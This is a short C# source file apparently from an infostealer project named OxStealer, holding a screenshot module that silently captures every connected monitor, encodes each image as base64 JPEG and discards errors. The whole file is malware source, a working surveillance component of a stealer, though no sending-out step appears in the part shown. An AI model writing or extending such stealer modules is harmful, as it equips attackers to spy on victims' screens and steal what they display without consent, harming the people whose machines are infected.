using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace OxStealer.Modules
{
    internal static class Screenshot
    {
        public static List<string> GrabAll()
        {
            var shots = new List<string>();
            foreach (var screen in Screen.AllScreens)
            {
                try
                {
                    using var bmp = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                    using var g = Graphics.FromImage(bmp);
                    g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size);
                    using var ms = new MemoryStream();
                    bmp.Save(ms, ImageFormat.Jpeg);
                    shots.Add(Convert.ToBase64String(ms.ToArray()));
                }
                catch { }
            }
            return shots;
        }
    }
}